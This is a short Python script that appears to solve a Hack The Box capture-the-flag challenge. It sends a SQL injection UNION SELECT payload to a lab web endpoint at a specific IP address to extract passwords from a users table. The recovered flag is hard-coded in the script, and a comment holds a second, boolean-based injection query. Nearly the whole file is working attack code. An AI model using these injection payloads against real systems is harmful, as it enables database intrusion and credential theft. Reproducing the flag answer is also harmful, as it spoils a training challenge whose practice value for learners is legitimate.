import requests
dict = "}ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_"
url = "http://46.101.8.93:30784/posts/"

# HTB{5qli_th3_3vergr33n_vu1n}

while True:
    for each in dict:
        val = "' UNION SELECT '1' as id ,password as title,'1' as thumbnail, '1' as content FROM users -- -"
        r = requests.get(url+val)
        print(r.text)
        print("Museum" in r.text)
        break

    break


# SELECT * FROM posts WHERE id='${ AND (SELECT count(*) from users where password = 'HTB{5qli_th3_3vergr33n_vu1n}')=1  -- -
